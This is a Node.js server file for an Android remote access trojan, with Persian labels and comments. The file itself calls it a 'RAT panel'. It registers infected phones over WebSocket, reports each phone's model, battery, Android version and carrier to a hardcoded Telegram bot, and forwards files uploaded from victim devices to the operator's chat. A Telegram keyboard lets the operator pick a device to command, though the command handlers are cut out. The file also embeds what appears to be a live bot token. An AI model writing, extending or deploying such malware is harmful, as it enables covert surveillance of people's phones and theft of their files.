const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const mime = require('mime-types');

const token = '8412123202:AAGKuP1EcyaCy2mKFNb-55RRkw3y-uNzu6k';
const id = '7934946400';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">سرور شما به درستی اپلود شد</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const contentType = mime.lookup(name) || 'application/octet-stream';
    console.log(`Uploading file: ${name}, Content-Type: ${contentType}`); // لاگ برای دیباگ
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• پیام از <b>${req.headers.model || 'Unknown'}</b> دستگاه
        📍CR :〔@LXNETU〕`,
        parse_mode: 'HTML'
    }, {
        filename: name,
        contentType: contentType
    }).catch(err => {
        console.log('Error sending document:', err.message); // لاگ برای خطا
    });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    console.log('New client connected:', req.headers); // لاگ برای دیباگ
    const uuid = uuid4.v4();
    ws.uuid = uuid;
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';

    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });

    appBot.sendMessage(id,
        `°• دستگاه جدید متصل شد\n\n` +
        `• مدل دستگاه : <b>${model}</b>\n` +
        `• باتری : <b>${battery}</b>\n` +
        `• نسخه اندروید : <b>${version}</b>\n` +
        `• روشنایی صفحه نمایش : <b>${brightness}</b>\n` +
        `• اپراتور : <b>${provider}</b>`,
        { parse_mode: 'HTML' }
    ).catch(err => {
        console.log('Error sending connection message:', err.message); // لاگ برای خطا
    });

    ws.on('close', function () {
        console.log('Client disconnected:', ws.uuid); // لاگ برای دیباگ
        appBot.sendMessage(id,
            `°• قطع اتصال دستگاه\n\n` +
            `• مدل دستگاه : <b>${model}</b>\n` +
            `• باتری : <b>${battery}</b>\n` +
            `• نسخه اندروید : <b>${version}</b>\n` +
            `• روشنایی صفحه نمایش : <b>${brightness}</b>\n` +
            `• اپراتور : <b>${provider}</b>`,
            { parse_mode: 'HTML' }
        ).catch(err => {
            console.log('Error sending disconnection message:', err.message); // لاگ برای خطا
        });
        appClients.delete(ws.uuid);
    });

    ws.on('error', function (error) {
        console.log('WebSocket error:', error.message); // لاگ برای خطا
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• به پنل رت خوش آمدید\n\n' +
                '• اگر برنامه بر روی دستگاه مورد نظر نصب شده است، منتظر اتصال باشید\n\n' +
                '• هنگامی که پیام اتصال را دریافت می کنید، به این معنی است که دستگاه مورد نظر متصل و آماده دریافت فرمان است\n\n' +
                '• روی دکمه 📃اجرای دستور کلیک کنید و دستگاه مورد نظر را انتخاب کنید سپس از بین دستورات دستور مورد نظر را انتخاب کنید\n\n' +
                '• برای تست سرور، دستور /test رو بفرستید\n\n' +
                '• My Channel: 〔@LXNETU ✨〕',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['📍دستگاه متصل'], ['📃اجرای دستور'], ['🧪تست سرور']],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.text == '🧪تست سرور') {
            appBot.sendMessage(id,
                `°• سرور در حال اجراست\n\n` +
                `• تعداد دستگاه‌های متصل: <b>${appClients.size}</b>\n` +
                `• آدرس سرور: <b>${process.env.RENDER_EXTERNAL_HOSTNAME || 'Unknown'}</b>\n` +
                `• پورت: <b>${process.env.PORT || 8999}</b>`,
                { parse_mode: 'HTML' }
            );
        }
        if (message.text == '📍دستگاه متصل') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ دستگاه اتصالی موجود نیست\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                );
            } else {
                let text = '°• فهرست دستگاه‌های متصل:\n\n';
                appClients.forEach(function (value, key, map) {
                    text += `• مدل دستگاه : <b>${value.model}</b>\n` +
                        `• باتری : <b>${value.battery}</b>\n` +
                        `• نسخه اندروید : <b>${value.version}</b>\n` +
                        `• روشنایی صفحه نمایش : <b>${value.brightness}</b>\n` +
                        `• اپراتور : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, { parse_mode: 'HTML' });
            }
        }
        if (message.text == '📃اجرای دستور') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ دستگاه اتصالی موجود نیست\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(id, '°• برای اجرای دستور دستگاه مورد نظر را انتخاب کنید', {
                    reply_markup: {
                        inline_keyboard: deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙');
    }
});

// بقیه کد مربوط به appBot.on('message') و appBot.on('callback_query') مثل کد قبلی بدون تغییر باقی می‌مونه
// برای کوتاه‌تر شدن، فقط بخش‌های اصلاح‌شده رو آوردم. اگه نیاز داری، بگو کل کد رو بذارم.

setInterval(function () {
    console.log('Sending ping to clients:', appClients.size); // لاگ برای دیباگ
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try {
        axios.get(address).then(r => '');
    } catch (e) {
        console.log('Ping error:', e.message); // لاگ برای دیباگ
    }
}, 5000);

const port = process.env.PORT || 8999;
appServer.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
